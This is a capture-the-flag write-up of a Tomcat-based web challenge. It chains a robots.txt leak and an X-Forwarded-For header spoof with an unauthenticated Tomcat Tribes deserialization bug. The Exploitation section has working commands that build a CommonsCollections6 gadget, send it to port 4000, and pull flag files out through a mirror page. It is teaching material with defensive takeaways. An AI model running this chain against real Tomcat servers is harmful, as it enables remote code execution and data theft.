# 2048

**Category:** Web  ·  **Flag:** `ASIS{t0McAT_was_Th3_KEY}`

## Challenge Description

A Rick and Morty-themed clone of the 2048 game, served by an Apache Tomcat
application. Prompt: *"Are you good @ 2048?"*, but you do **not** need to win
the game. The real path runs through leaked internal notes, a trusted-header
bypass, and an unauthenticated Tomcat cluster deserialization bug.

## Initial Analysis

The game is pure client-side JavaScript, so winning it unlocks nothing on the
server. The HTML source contains a decoy comment:

```html
<!-- TODO(staff): before the next citadel audit rotate the staging code -> ASIS{lo0k_at_t41s_scr1pt_kiddi3} -->
```

That "staging code" is a red herring. `robots.txt` leaks the real lead:

```
Disallow: /citadel/
Disallow: /citadel/lab-notes.html
Disallow: /admin/
# w-w-was there another door into the intranet? like a diagnostics thing?
```

`robots.txt` is not access control, so `/citadel/lab-notes.html` is directly
readable and narrates almost the whole exploit chain in flavor text:

| Lab note | Technical meaning |
|---|---|
| Garage gateway on TCP 4000 | Tomcat Tribes cluster receiver exposed on port 4000 |
| Parcels use AES/CBC/PKCS5Padding | Tribes `EncryptInterceptor` is enabled |
| Failed parcels shipped downstairs anyway | Decryption **fails open** |
| Session keeper eats whatever arrives | Data reaching the next layer is deserialized |
| Old Commons library | Commons Collections gadget available |
| Flag halves in `/opt/citadel/vault` and `/opt/citadel/gate` | Read these after RCE |
| `/opt/citadel/shared` writable + mirrored by `mirror.jsp` | Exfil route |
| Diagnostics trusts what a proxy says about the source | `X-Forwarded-For` spoof |

The diagnostics page rejects remote callers:

```json
{"error":"access denied","quip":"Entry is available only from the local garage..."}
```

Spoofing the trusted proxy header bypasses it:

```bash
curl -s -H 'X-Forwarded-For: 127.0.0.1' http://REDACTED/diagnostics.jsp
```

which confirms `Apache Tomcat/9.0.116`, `runningAs: citadel`,
`commons-collections-3.2.1.jar` on the classpath, a Tribes receiver on
`tcp *:4000` with cipher `AES/CBC/PKCS5Padding`, and the citadel layout. See
`loot/diagnostics.json`, `loot/robots.txt`, `loot/mirror.jsp`.

## Vulnerability / Core Concept

**CVE-2026-34486**: a fail-open bug in Apache Tomcat Tribes'
`EncryptInterceptor`. When an incoming cluster message cannot be decrypted, the
interceptor logs the failure but passes the *original, unencrypted* bytes
onward, where they are deserialized. With `commons-collections-3.2.1` on the
classpath, a CommonsCollections gadget chain turns that deserialization into
`Runtime.exec()`.

The receiver on port 4000 is publicly reachable (`nc -vz host 4000` succeeds),
so the attack is unauthenticated:

1. Send an unencrypted Tribes message.
2. AES decryption fails → logged.
3. Fail-open passes our bytes to the deserializer.
4. Commons Collections gadget → command execution as `citadel`.

## Exploitation

Using the public reproducer (see `exploit/README.md`,
[striga.ai writeup](https://striga.ai/research/tomcat-tribes-unauth-rce)),
`exploit/GadgetGen.java` builds a CommonsCollections6 payload and
`exploit/send_payload.py` wraps the serialized object in a valid Tribes packet
(`FLT2002 … TLF2003`).

```bash
# Build the gadget
javac -cp commons-collections-3.2.1.jar GadgetGen.java

LABEL="c137_$(date +%s)_$RANDOM"
CMD="cat /opt/citadel/vault/* /opt/citadel/gate/* > /opt/citadel/shared/$LABEL"
java --add-opens java.base/java.util=ALL-UNNAMED \
     --add-opens java.base/java.lang.reflect=ALL-UNNAMED \
     -cp '.:commons-collections-3.2.1.jar' GadgetGen "$CMD" payload.bin

# Fire it at the Tribes receiver
python3 send_payload.py <host> 4000 payload.bin

# Retrieve via the mirror (shared dir is world-writable + one-shot download)
curl "http://REDACTED/mirror.jsp?parcel=$LABEL"
```

The vault/gate directories contain decoys (`README`, `flag.txt` →
`ASIS{do_you_think_rick_sanchez_is_stupid?}`). A hexdump inventory (see
`loot/inspect.txt`) separates the real split fragments, whose filenames are
randomized per restart:

```
/opt/citadel/vault/pf_*.asc   -> ASIS{t0McAT_was
/opt/citadel/gate/launch_*.conf -> _Th3_KEY}
```

`loot/mirror_response.txt` shows a captured exfil response (session cookie
redacted).

## Flag

`ASIS{t0McAT_was_Th3_KEY}`

## Key Takeaways

- `robots.txt` hides nothing; it advertises hidden paths.
- Never trust `X-Forwarded-For` unless the request came from a proxy you control.
- Internal cluster ports (Tomcat Tribes / 4000) must never face untrusted networks.
- Crypto must **fail closed**: a failed decrypt should discard the message.
- Java deserialization + a known gadget library on the classpath = RCE.
- A file literally named `flag.txt` can be lying to you.
